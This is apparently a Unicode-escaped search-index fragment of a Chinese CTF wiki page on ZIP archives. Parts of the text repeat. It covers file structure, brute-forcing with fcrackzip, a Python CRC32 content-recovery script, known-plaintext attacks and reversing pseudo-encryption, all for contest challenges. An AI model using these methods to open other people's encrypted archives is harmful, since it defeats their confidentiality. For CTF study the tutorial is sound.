\u6838\u5fc3\u76ee\u5f55 \u76ee\u5f55\u7ed3\u675f local file header + file data + data descriptor central directory end of central directory record \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u4e2a\u538b\u7f29\u7684\u6e90\u6587\u4ef6\u6216\u76ee\u5f55\u90fd\u662f\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4e2d local file header\uff1a\u6587\u4ef6\u5934\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u7684\u5f00\u59cb\uff0c\u8bb0\u5f55\u4e86\u8be5\u538b\u7f29\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u5934\u6807\u8bc6\u7531\u56fa\u5b9a\u503c 50 4B 03 04 \u5f00\u5934\uff0c\u4e5f\u662f ZIP \u7684\u6587\u4ef6\u5934\u7684\u91cd\u8981\u6807\u5fd7 file data\uff1a\u6587\u4ef6\u6570\u636e\u8bb0\u5f55\u4e86\u76f8\u5e94\u538b\u7f29\u6587\u4ef6\u7684\u6570\u636e data descriptor\uff1a\u6570\u636e\u63cf\u8ff0\u7b26\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u538b\u7f29\u7ed3\u675f\uff0c\u8be5\u7ed3\u6784\u53ea\u6709\u5728\u76f8\u5e94\u7684 local file header \u4e2d\u901a\u7528\u6807\u8bb0\u5b57\u6bb5\u7684\u7b2c 3 bit\u8bbe\u4e3a 1 \u65f6\u624d\u4f1a\u51fa\u73b0\uff0c\u7d27\u63a5\u5728\u538b\u7f29\u6587\u4ef6\u6e90\u6570\u636e\u540e Central directory \u6838\u5fc3\u76ee\u5f55 \u8bb0\u5f55\u4e86\u538b\u7f29\u6587\u4ef6\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u5728\u8fd9\u4e2a\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u6761\u7eaa\u5f55\u5bf9\u5e94\u5728\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684\u4e00\u6761\u6570\u636e\u3002 Offset Bytes Description \u8bd1 0 4 Central directory file header signature = 0x02014b50 \u6838\u5fc3\u76ee\u5f55\u6587\u4ef6 header\u6807\u8bc6 =\uff080x02014b50\uff09 4 2 Version made by \u538b\u7f29\u6240\u7528\u7684 pkware \u7248\u672c 6 2 Version needed to extract (minimum) \u89e3\u538b\u6240\u9700 pkware \u7684\u6700\u4f4e\u7248\u672c 8 2 General purpose bit flag \u901a\u7528\u4f4d\u6807\u8bb0\u4f2a\u52a0\u5bc6 10 2 Compression method \u538b\u7f29\u65b9\u6cd5 12 2 File last modification time \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65f6\u95f4 14 2 File last modification date \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65e5\u671f 16 4 CRC-32 CRC-32 \u6821\u9a8c\u7801 20 4 Compressed size \u538b\u7f29\u540e\u7684\u5927\u5c0f 24 4 Uncompressed size \u672a\u538b\u7f29\u7684\u5927\u5c0f 28 2 File name length (n) \u6587\u4ef6\u540d\u957f\u5ea6 30 2 Extra field length (m) \u6269\u5c55\u57df\u957f\u5ea6 32 2 File comment length (k) \u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6 34 2 Disk number where file starts \u6587\u4ef6\u5f00\u59cb\u4f4d\u7f6e\u7684\u78c1\u76d8\u7f16\u53f7 36 2 Internal file attributes \u5185\u90e8\u6587\u4ef6\u5c5e\u6027 38 4 External file attributes \u5916\u90e8\u6587\u4ef6\u5c5e\u6027 42 4 relative offset of local header \u672c\u5730\u6587\u4ef6\u5934\u7684\u76f8\u5bf9\u4f4d\u79fb 46 n File name \u76ee\u5f55\u6587\u4ef6\u540d 46+n m Extra field \u6269\u5c55\u57df 46+n+m k File comment \u6587\u4ef6\u6ce8\u91ca\u5185\u5bb9 End of central directory record\uff08EOCD\uff09\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6 \u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\u5b58\u5728\u4e8e\u6574\u4e2a\u5f52\u6863\u5305\u7684\u7ed3\u5c3e\uff0c\u7528\u4e8e\u6807\u8bb0\u538b\u7f29\u7684\u76ee\u5f55\u6570\u636e\u7684\u7ed3\u675f\u3002\u6bcf\u4e2a\u538b\u7f29\u6587\u4ef6\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2aEOCD\u8bb0\u5f55\u3002 \u66f4\u52a0\u8be6\u7ec6\u53c2\u89c1 \u5b98\u65b9\u6587\u6863 \u3002 \u4e3b\u8981\u653b\u51fb \u00b6 \u7206\u7834 \u00b6 \u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e24\u6b3e\u7206\u7834\u4f7f\u7528\u7684\u5de5\u5177 Windows\u4e0b\u7684\u795e\u5668 ARCHPR \u66b4\u529b\u679a\u4e3e\uff0c\u8dd1\u5b57\u5178\uff0c\u660e\u6587\u653b\u51fb\uff0c\u5e94\u6709\u5c3d\u6709\u3002 Linux\u4e0b\u7684\u547d\u4ee4\u884c\u5de5\u5177 fcrackzip # \uff0db \u6307\u5b9a\u6a21\u5f0f\u4e3a\u66b4\u7834\uff0c-c1\u6307\u5b9a\u5bc6\u7801\u7c7b\u578b\u4e3a\u7eaf\u6570\u5b57\uff0c\u5176\u5b83\u7c7b\u578b\u53ef\u4ee5rtfm,-u\u8fd9\u4e2a\u53c2\u6570\u975e\u5e38\u91cd\u8981\u4e0d\u7136\u4e0d\u663e\u793a\u7834\u89e3\u51fa\u6765\u7684\u5bc6\u7801,-l 5-6\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6 root@kali:fcrackzip -b -c1 -u test.zip CRC32 \u00b6 \u539f\u7406 \u00b6 CRC \u672c\u8eab\u662f\u300c\u5197\u4f59\u6821\u9a8c\u7801\u300d\u7684\u610f\u601d\uff0cCRC32 \u5219\u8868\u793a\u4f1a\u4ea7\u751f\u4e00\u4e2a 32 bit\uff088 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff09\u7684\u6821\u9a8c\u503c\u3002\u7531\u4e8e CRC32 \u4ea7\u751f\u6821\u9a8c\u503c\u65f6\u6e90\u6570\u636e\u5757\u7684\u6bcf\u4e00\u4e2a bit\uff08\u4f4d\uff09\u90fd\u53c2\u4e0e\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6570\u636e\u5757\u4e2d\u5373\u4f7f\u53ea\u6709\u4e00\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e0d\u540c\u7684 CRC32 \u503c\u3002 CRC32 \u6821\u9a8c\u7801\u51fa\u73b0\u5728\u5f88\u591a\u6587\u4ef6\u4e2d\u6bd4\u5982 png \u6587\u4ef6\uff0c\u540c\u6837 zip \u4e2d\u4e5f\u6709 CRC32 \u6821\u9a8c\u7801\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f zip \u4e2d\u7684 CRC32 \u662f\u672a\u52a0\u5bc6\u6587\u4ef6\u7684\u6821\u9a8c\u503c\u3002 \u8fd9\u4e5f\u5c31\u5bfc\u81f4\u4e86\u57fa\u4e8e CRC32 \u7684\u653b\u51fb\u624b\u6cd5\u3002 \u6587\u4ef6\u5185\u5185\u5bb9\u5f88\u5c11\uff08\u4e00\u822c\u6bd4\u8d5b\u4e2d\u5927\u591a\u4e3a 4 \u5b57\u8282\u5de6\u53f3\uff09 \u52a0\u5bc6\u7684\u5bc6\u7801\u5f88\u957f \u6211\u4eec\u4e0d\u53bb\u7206\u7834\u538b\u7f29\u5305\u7684\u5bc6\u7801\uff0c\u800c\u662f\u76f4\u63a5\u53bb\u76f4\u63a5\u7206\u7834\u6e90\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u4e00\u822c\u90fd\u662f\u53ef\u89c1\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u60f3\u8981\u7684\u4fe1\u606f\u3002 \u6bd4\u5982\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a flag.txt \uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a 123 \uff0c\u4f7f\u7528\u5bc6\u7801 !QAZXSW@#EDCVFR$ \u53bb\u52a0\u5bc6\u3002 \u800c\u6211\u4eec\u53bb\u8ba1\u7b97\u6587\u4ef6\u7684 CRC32 \u503c\u53d1\u73b0\u548c\u4e0a\u56fe\u4e2d\u7684 CRC32 \u503c\u543b\u5408\u3002 \u6587\u4ef6: flag.txt \u5927\u5c0f: 3 \u65f6\u95f4: Tue, 29 Aug 2017 10 :38:10 +0800 MD5: 202cb962ac59075b964b07152d234b70 SHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef CRC32: 884863D2 Note \u5728\u7206\u7834\u65f6\u6211\u4eec\u6240\u679a\u4e3e\u7684\u6240\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u7684CRC32\u503c\u662f\u8981\u4e0e\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684CRC32\u503c\u6240\u5bf9\u5e94 # -*- coding: utf-8 -*- import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" f = open ( 'flag.zip' ) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\" \u4f8b\u9898 \u00b6 Abctf-2016:Zippy \u6839\u636e\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6\u5927\u5c0f\u53ef\u4ee5\u63a8\u65ad\u4f7f\u7528 CRC32 \u653b\u51fb\u624b\u6cd5\uff0c\u83b7\u5f97\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u5185\u5bb9\u540e\u8fde\u5728\u4e00\u8d77 Base64 \u89e3\u7801\u540e\u65f6\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305\uff0c\u7206\u7834\u83b7\u5f97 flag\u3002 \u660e\u6587\u653b\u51fb \u00b6 \u539f\u7406 \u00b6 \u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0cWinRAR\uff0c7z\u3002zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528 zipinfo -v \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49 \u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9\uff08\u81f3\u5c11 12 \u5b57\u8282\uff09 \u5982\u679c\u4f60\u5df2\u7ecf\u77e5\u9053\u52a0\u5bc6\u6587\u4ef6\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u6bd4\u5982\u5728\u67d0\u4e2a\u7f51\u7ad9\u4e0a\u53d1\u73b0\u4e86\u5b83\u7684 readme.txt \u6587\u4ef6\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u7834\u89e3\u4e86\u3002 \u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip\u3002 \u6253\u5305\u5b8c\u6210\u540e\uff0c\u9700\u8981\u786e\u8ba4\u4e8c\u8005\u91c7\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u76f8\u540c\u3002\u4e00\u4e2a\u7b80\u5355\u7684\u5224\u65ad\u65b9\u6cd5\u662f\u7528 WinRAR \u6253\u5f00\u6587\u4ef6\uff0c\u540c\u4e00\u4e2a\u6587\u4ef6\u538b\u7f29\u540e\u7684\u4f53\u79ef\u662f\u5426\u76f8\u540c\u3002\u5982\u679c\u76f8\u540c\uff0c\u57fa\u672c\u53ef\u4ee5\u8bf4\u660e\u4f60\u7528\u7684\u538b\u7f29\u7b97\u6cd5\u662f\u6b63\u786e\u7684\u3002\u5982\u679c\u4e0d\u540c\uff0c\u5c31\u5c1d\u8bd5\u53e6\u4e00\u79cd\u538b\u7f29\u7b97\u6cd5\u3002 \u5de5\u5177 \u00b6 Windows\u4e0b\u7684\u795e\u5668 ARCHPR Linux\u4e0b\u7684 PKCrack Note \u5efa\u8bae\u4f7f\u7528 Windows \u7684 ARCHPR\uff0c\u4e00\u662f\u901f\u5ea6\u8f83\u5feb\uff0c\u4e8c\u662f\u8f83\u7a33\u5b9a\uff08\u4e4b\u524d\u51fa\u9898\u65f6\u9047\u5230\u8fc7\u7528 PKCrack \u7206\u4e0d\u51fa\u6765\u7684\u60c5\u51b5\uff09\u3002 \u4f2a\u52a0\u5bc6 \u00b6 \u539f\u7406 \u00b6 \u5728\u4e0a\u6587 ZIP \u683c\u5f0f\u4e2d\u7684 \u6838\u5fc3\u76ee\u5f55\u533a \u4e2d\uff0c\u6211\u4eec\u5f3a\u8c03\u4e86\u4e00\u4e2a\u53eb\u505a\u901a\u7528\u4f4d\u6807\u8bb0\uff08General purpose bit flag\uff09\u7684 2 \u5b57\u8282\uff0c\u4e0d\u540c\u6bd4\u7279\u4f4d\u6709\u7740\u4e0d\u540c\u7684\u542b\u4e49\u3002 Bit 0 : If set, indicates that the file is encrypted. ( For Method 6 - Imploding ) Bit 1 : If the compression method used was type 6 , Imploding, then this bit, if set, indicates an 8K sliding dictionary was used. If clear, then a 4K sliding dictionary was used. ... Bit 6 : Strong encryption. If this bit is set, you should set the version needed to extract value to at least 50 and you must also set bit 0 . If AES encryption is used, the version needed to extract value must be at least 51 . ... \u5728 010Editor \u4e2d\u6211\u4eec\u5c1d\u8bd5\u7740\u5c06\u8fd9 1 \u4f4d\u4fee\u6539 0 --> 1 \u3002 \u518d\u6253\u5f00\u6587\u4ef6\u53d1\u73b0\u5df2\u8981\u6c42\u8f93\u5165\u5bc6\u7801\u3002 \u4fee\u6539\u4f2a\u52a0\u5bc6\u7684\u65b9\u6cd5\uff1a 16 \u8fdb\u5236\u4e0b\u4fee\u6539\u901a\u7528\u4f4d\u6807\u8bb0 binwalk -e \u65e0\u89c6\u4f2a\u52a0\u5bc6 \u5728 Mac OS \u53ca\u90e8\u5206 Linux\uff08\u5982 Kali\uff09\u7cfb\u7edf\u4e2d\uff0c\u53ef\u4ee5\u76f4\u63a5\u6253\u5f00\u4f2a\u52a0\u5bc6\u7684 ZIP \u538b\u7f29\u5305 \u68c0\u6d4b\u4f2a\u52a0\u5bc6\u7684\u5c0f\u5de5\u5177 ZipCenOp.jar \u6709\u65f6\u5019\u7528 WinRar \u7684\u4fee\u590d\u529f\u80fd\uff08\u6b64\u65b9\u6cd5\u6709\u65f6\u6709\u5947\u6548\uff0c\u4e0d\u4ec5\u9488\u5bf9\u4f2a\u52a0\u5bc6\uff09 \u4f8b\u9898 \u00b6 SSCTF-2017:\u6211\u4eec\u7684\u79d8\u5bc6\u662f\u7eff\u8272\u7684 WP: http://bobao.360.cn/ctf/detail/197.html \u6211\u4eec\u5728\u5f97\u5230\u4e24\u4e2a readme.txt \uff0c\u4e14\u4e00\u4e2a\u52a0\u5bc6\uff0c\u4e00\u4e2a\u5df2\u77e5\uff0c\u5f88\u5bb9\u6613\u60f3\u5230\u660e\u6587\u653b\u51fb\u7684\u624b\u6cd5\u3002 \u6ce8\u610f\u5728\u7528\u660e\u6587\u653b\u51fb\u65f6\u7684\u64cd\u4f5c\u3002 \u5f97\u5230\u5bc6\u7801 Y29mZmVl \u540e\uff0c\u89e3\u538b\u7f29\u6587\u4ef6\uff0c\u5f97\u5230\u53e6\u4e00\u4e2a\u538b\u7f29\u5305\u3002 \u89c2\u5bdf\u901a\u7528\u4f4d\u6807\u8bb0\u4f4d\uff0c\u731c\u6d4b\u4f2a\u52a0\u5bc6\uff0c\u4fee\u6539\u540e\u89e3\u538b\u5f97\u5230 flag\u3002 \u8fd9\u4e00\u9898\uff0c\u57fa\u672c\u6db5\u76d6\u4e86\u6bd4\u8d5b\u4e2d ZIP \u7684\u5e38\u89c1\u8003\u5bdf\u624b\u6cd5\uff0c\u7206\u7834\uff0c\u4f2a\u52a0\u5bc6\uff0c\u660e\u6587\u653b\u51fb\u7b49\uff0c\u90fd\u5728\u672c\u9898\u4e2d\u51fa\u73b0\u3002","title":"ZIP \u683c\u5f0f"},{"location":"misc/archive/zip/#_1","text":"ZIP \u6587\u4ef6\u4e3b\u8981\u7531\u4e09\u90e8\u5206\u6784\u6210\uff0c\u5206\u522b\u4e3a \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a \u6838\u5fc3\u76ee\u5f55 \u76ee\u5f55\u7ed3\u675f local file header + file data + data descriptor central directory end of central directory record \u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u4e2a\u538b\u7f29\u7684\u6e90\u6587\u4ef6\u6216\u76ee\u5f55\u90fd\u662f\u4e00\u6761\u8bb0\u5f55\uff0c\u5176\u4e2d local file header\uff1a\u6587\u4ef6\u5934\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u7684\u5f00\u59cb\uff0c\u8bb0\u5f55\u4e86\u8be5\u538b\u7f29\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u8fd9\u91cc\u7684\u6587\u4ef6\u5934\u6807\u8bc6\u7531\u56fa\u5b9a\u503c 50 4B 03 04 \u5f00\u5934\uff0c\u4e5f\u662f ZIP \u7684\u6587\u4ef6\u5934\u7684\u91cd\u8981\u6807\u5fd7 file data\uff1a\u6587\u4ef6\u6570\u636e\u8bb0\u5f55\u4e86\u76f8\u5e94\u538b\u7f29\u6587\u4ef6\u7684\u6570\u636e data descriptor\uff1a\u6570\u636e\u63cf\u8ff0\u7b26\u7528\u4e8e\u6807\u8bc6\u8be5\u6587\u4ef6\u538b\u7f29\u7ed3\u675f\uff0c\u8be5\u7ed3\u6784\u53ea\u6709\u5728\u76f8\u5e94\u7684 local file header \u4e2d\u901a\u7528\u6807\u8bb0\u5b57\u6bb5\u7684\u7b2c 3 bit\u8bbe\u4e3a 1 \u65f6\u624d\u4f1a\u51fa\u73b0\uff0c\u7d27\u63a5\u5728\u538b\u7f29\u6587\u4ef6\u6e90\u6570\u636e\u540e Central directory \u6838\u5fc3\u76ee\u5f55 \u8bb0\u5f55\u4e86\u538b\u7f29\u6587\u4ef6\u7684\u76ee\u5f55\u4fe1\u606f\uff0c\u5728\u8fd9\u4e2a\u6570\u636e\u533a\u4e2d\u6bcf\u4e00\u6761\u7eaa\u5f55\u5bf9\u5e94\u5728\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684\u4e00\u6761\u6570\u636e\u3002 Offset Bytes Description \u8bd1 0 4 Central directory file header signature = 0x02014b50 \u6838\u5fc3\u76ee\u5f55\u6587\u4ef6 header\u6807\u8bc6 =\uff080x02014b50\uff09 4 2 Version made by \u538b\u7f29\u6240\u7528\u7684 pkware \u7248\u672c 6 2 Version needed to extract (minimum) \u89e3\u538b\u6240\u9700 pkware \u7684\u6700\u4f4e\u7248\u672c 8 2 General purpose bit flag \u901a\u7528\u4f4d\u6807\u8bb0\u4f2a\u52a0\u5bc6 10 2 Compression method \u538b\u7f29\u65b9\u6cd5 12 2 File last modification time \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65f6\u95f4 14 2 File last modification date \u6587\u4ef6\u6700\u540e\u4fee\u6539\u65e5\u671f 16 4 CRC-32 CRC-32 \u6821\u9a8c\u7801 20 4 Compressed size \u538b\u7f29\u540e\u7684\u5927\u5c0f 24 4 Uncompressed size \u672a\u538b\u7f29\u7684\u5927\u5c0f 28 2 File name length (n) \u6587\u4ef6\u540d\u957f\u5ea6 30 2 Extra field length (m) \u6269\u5c55\u57df\u957f\u5ea6 32 2 File comment length (k) \u6587\u4ef6\u6ce8\u91ca\u957f\u5ea6 34 2 Disk number where file starts \u6587\u4ef6\u5f00\u59cb\u4f4d\u7f6e\u7684\u78c1\u76d8\u7f16\u53f7 36 2 Internal file attributes \u5185\u90e8\u6587\u4ef6\u5c5e\u6027 38 4 External file attributes \u5916\u90e8\u6587\u4ef6\u5c5e\u6027 42 4 relative offset of local header \u672c\u5730\u6587\u4ef6\u5934\u7684\u76f8\u5bf9\u4f4d\u79fb 46 n File name \u76ee\u5f55\u6587\u4ef6\u540d 46+n m Extra field \u6269\u5c55\u57df 46+n+m k File comment \u6587\u4ef6\u6ce8\u91ca\u5185\u5bb9 End of central directory record\uff08EOCD\uff09\u76ee\u5f55\u7ed3\u675f\u6807\u8bc6 \u76ee\u5f55\u7ed3\u675f\u6807\u8bc6\u5b58\u5728\u4e8e\u6574\u4e2a\u5f52\u6863\u5305\u7684\u7ed3\u5c3e\uff0c\u7528\u4e8e\u6807\u8bb0\u538b\u7f29\u7684\u76ee\u5f55\u6570\u636e\u7684\u7ed3\u675f\u3002\u6bcf\u4e2a\u538b\u7f29\u6587\u4ef6\u5fc5\u987b\u6709\u4e14\u53ea\u6709\u4e00\u4e2aEOCD\u8bb0\u5f55\u3002 \u66f4\u52a0\u8be6\u7ec6\u53c2\u89c1 \u5b98\u65b9\u6587\u6863 \u3002","title":"\u6587\u4ef6\u7ed3\u6784"},{"location":"misc/archive/zip/#_2","text":"","title":"\u4e3b\u8981\u653b\u51fb"},{"location":"misc/archive/zip/#_3","text":"\u8fd9\u91cc\u4e3b\u8981\u4ecb\u7ecd\u4e24\u6b3e\u7206\u7834\u4f7f\u7528\u7684\u5de5\u5177 Windows\u4e0b\u7684\u795e\u5668 ARCHPR \u66b4\u529b\u679a\u4e3e\uff0c\u8dd1\u5b57\u5178\uff0c\u660e\u6587\u653b\u51fb\uff0c\u5e94\u6709\u5c3d\u6709\u3002 Linux\u4e0b\u7684\u547d\u4ee4\u884c\u5de5\u5177 fcrackzip # \uff0db \u6307\u5b9a\u6a21\u5f0f\u4e3a\u66b4\u7834\uff0c-c1\u6307\u5b9a\u5bc6\u7801\u7c7b\u578b\u4e3a\u7eaf\u6570\u5b57\uff0c\u5176\u5b83\u7c7b\u578b\u53ef\u4ee5rtfm,-u\u8fd9\u4e2a\u53c2\u6570\u975e\u5e38\u91cd\u8981\u4e0d\u7136\u4e0d\u663e\u793a\u7834\u89e3\u51fa\u6765\u7684\u5bc6\u7801,-l 5-6\u53ef\u4ee5\u6307\u5b9a\u957f\u5ea6 root@kali:fcrackzip -b -c1 -u test.zip","title":"\u7206\u7834"},{"location":"misc/archive/zip/#crc32","text":"","title":"CRC32"},{"location":"misc/archive/zip/#_4","text":"CRC \u672c\u8eab\u662f\u300c\u5197\u4f59\u6821\u9a8c\u7801\u300d\u7684\u610f\u601d\uff0cCRC32 \u5219\u8868\u793a\u4f1a\u4ea7\u751f\u4e00\u4e2a 32 bit\uff088 \u4f4d\u5341\u516d\u8fdb\u5236\u6570\uff09\u7684\u6821\u9a8c\u503c\u3002\u7531\u4e8e CRC32 \u4ea7\u751f\u6821\u9a8c\u503c\u65f6\u6e90\u6570\u636e\u5757\u7684\u6bcf\u4e00\u4e2a bit\uff08\u4f4d\uff09\u90fd\u53c2\u4e0e\u4e86\u8ba1\u7b97\uff0c\u6240\u4ee5\u6570\u636e\u5757\u4e2d\u5373\u4f7f\u53ea\u6709\u4e00\u4f4d\u53d1\u751f\u4e86\u53d8\u5316\uff0c\u4e5f\u4f1a\u5f97\u5230\u4e0d\u540c\u7684 CRC32 \u503c\u3002 CRC32 \u6821\u9a8c\u7801\u51fa\u73b0\u5728\u5f88\u591a\u6587\u4ef6\u4e2d\u6bd4\u5982 png \u6587\u4ef6\uff0c\u540c\u6837 zip \u4e2d\u4e5f\u6709 CRC32 \u6821\u9a8c\u7801\u3002\u503c\u5f97\u6ce8\u610f\u7684\u662f zip \u4e2d\u7684 CRC32 \u662f\u672a\u52a0\u5bc6\u6587\u4ef6\u7684\u6821\u9a8c\u503c\u3002 \u8fd9\u4e5f\u5c31\u5bfc\u81f4\u4e86\u57fa\u4e8e CRC32 \u7684\u653b\u51fb\u624b\u6cd5\u3002 \u6587\u4ef6\u5185\u5185\u5bb9\u5f88\u5c11\uff08\u4e00\u822c\u6bd4\u8d5b\u4e2d\u5927\u591a\u4e3a 4 \u5b57\u8282\u5de6\u53f3\uff09 \u52a0\u5bc6\u7684\u5bc6\u7801\u5f88\u957f \u6211\u4eec\u4e0d\u53bb\u7206\u7834\u538b\u7f29\u5305\u7684\u5bc6\u7801\uff0c\u800c\u662f\u76f4\u63a5\u53bb\u76f4\u63a5\u7206\u7834\u6e90\u6587\u4ef6\u7684\u5185\u5bb9\uff08\u4e00\u822c\u90fd\u662f\u53ef\u89c1\u7684\u5b57\u7b26\u4e32\uff09\uff0c\u4ece\u800c\u83b7\u53d6\u60f3\u8981\u7684\u4fe1\u606f\u3002 \u6bd4\u5982\u6211\u4eec\u65b0\u5efa\u4e00\u4e2a flag.txt \uff0c\u5176\u4e2d\u5185\u5bb9\u4e3a 123 \uff0c\u4f7f\u7528\u5bc6\u7801 !QAZXSW@#EDCVFR$ \u53bb\u52a0\u5bc6\u3002 \u800c\u6211\u4eec\u53bb\u8ba1\u7b97\u6587\u4ef6\u7684 CRC32 \u503c\u53d1\u73b0\u548c\u4e0a\u56fe\u4e2d\u7684 CRC32 \u503c\u543b\u5408\u3002 \u6587\u4ef6: flag.txt \u5927\u5c0f: 3 \u65f6\u95f4: Tue, 29 Aug 2017 10 :38:10 +0800 MD5: 202cb962ac59075b964b07152d234b70 SHA1: 40bd001563085fc35165329ea1ff5c5ecbdbbeef CRC32: 884863D2 Note \u5728\u7206\u7834\u65f6\u6211\u4eec\u6240\u679a\u4e3e\u7684\u6240\u6709\u53ef\u80fd\u5b57\u7b26\u4e32\u7684CRC32\u503c\u662f\u8981\u4e0e\u538b\u7f29\u6e90\u6587\u4ef6\u6570\u636e\u533a\u4e2d\u7684CRC32\u503c\u6240\u5bf9\u5e94 # -*- coding: utf-8 -*- import binascii import base64 import string import itertools import struct alph = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=' crcdict = {} print \"computing all possible CRCs...\" for x in itertools . product ( list ( alph ), repeat = 4 ): st = '' . join ( x ) testcrc = binascii . crc32 ( st ) crcdict [ struct . pack ( '<i' , testcrc )] = st print \"Done!\" f = open ( 'flag.zip' ) data = f . read () f . close () crc = '' . join ( data [ 14 : 18 ]) if crc in crcdict : print crcdict [ crc ] else : print \"FAILED!\"","title":"\u539f\u7406"},{"location":"misc/archive/zip/#_5","text":"Abctf-2016:Zippy \u6839\u636e\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u6587\u4ef6\u5927\u5c0f\u53ef\u4ee5\u63a8\u65ad\u4f7f\u7528 CRC32 \u653b\u51fb\u624b\u6cd5\uff0c\u83b7\u5f97\u6bcf\u4e2a\u538b\u7f29\u5305\u5185\u7684\u5185\u5bb9\u540e\u8fde\u5728\u4e00\u8d77 Base64 \u89e3\u7801\u540e\u65f6\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u5305\uff0c\u7206\u7834\u83b7\u5f97 flag\u3002","title":"\u4f8b\u9898"},{"location":"misc/archive/zip/#_6","text":"","title":"\u660e\u6587\u653b\u51fb"},{"location":"misc/archive/zip/#_7","text":"\u4e00\u4e2a\u52a0\u5bc6\u7684\u538b\u7f29\u6587\u4ef6 \u538b\u7f29\u6587\u4ef6\u7684\u538b\u7f29\u5de5\u5177\uff0c\u6bd4\u5982 2345 \u597d\u538b\uff0cWinRAR\uff0c7z\u3002zip \u7248\u672c\u53f7\u7b49\uff0c\u53ef\u4ee5\u901a\u8fc7\u6587\u4ef6\u5c5e\u6027\u4e86\u89e3\u3002\u5982\u679c\u662f Linux \u5e73\u53f0\uff0c\u7528 zipinfo -v \u53ef\u4ee5\u67e5\u770b\u4e00\u4e2a zip \u5305\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u5305\u62ec\u52a0\u5bc6\u7b97\u6cd5\u7b49 \u77e5\u9053\u538b\u7f29\u5305\u91cc\u67d0\u4e2a\u6587\u4ef6\u7684\u90e8\u5206\u8fde\u7eed\u5185\u5bb9\uff08\u81f3\u5c11 12 \u5b57\u8282\uff09 \u5982\u679c\u4f60\u5df2\u7ecf\u77e5\u9053\u52a0\u5bc6\u6587\u4ef6\u7684\u90e8\u5206\u5185\u5bb9\uff0c\u6bd4\u5982\u5728\u67d0\u4e2a\u7f51\u7ad9\u4e0a\u53d1\u73b0\u4e86\u5b83\u7684 readme.txt \u6587\u4ef6\uff0c\u4f60\u5c31\u53ef\u4ee5\u5f00\u59cb\u5c1d\u8bd5\u7834\u89e3\u4e86\u3002 \u9996\u5148\uff0c\u5c06\u8fd9\u4e2a\u660e\u6587\u6587\u4ef6\u6253\u5305\u6210 zip \u5305\uff0c\u6bd4\u5982\u5c06 readme.txt \u6253\u5305\u6210 readme.zip\u3002 